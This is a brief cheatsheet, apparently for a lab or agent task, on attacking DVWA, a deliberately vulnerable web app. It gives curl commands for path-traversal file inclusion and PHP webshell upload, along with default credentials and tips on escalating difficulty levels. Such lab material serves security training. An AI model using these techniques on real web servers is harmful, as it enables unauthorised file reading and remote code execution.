# Cheatsheet — DVWA Basics

## Targets

- **dvwa01** — DVWA (Damn Vulnerable Web App) in a docker container on :80

## Useful commands

```bash
# login: admin / password — then set security to 'low' on /security.php
curl -s -b 'PHPSESSID=<sess>; security=low' \
  'http://<dvwa01>/vulnerabilities/fi/?page=../../<path>'
# upload: /vulnerabilities/upload/ accepts the file, tells you where it landed
curl -s -F 'uploaded=@<shell.php>' -F 'Upload=Upload' \
  -b 'PHPSESSID=<sess>' http://<dvwa01>/vulnerabilities/upload/
```

## Concepts

- Work low → medium → high: each level teaches one bypass technique
- The cookie carries the difficulty — replay it in every tool call
- File inclusion reads any path the webserver user can reach
- Upload + known path = webshell; the state flag checks the upload dir
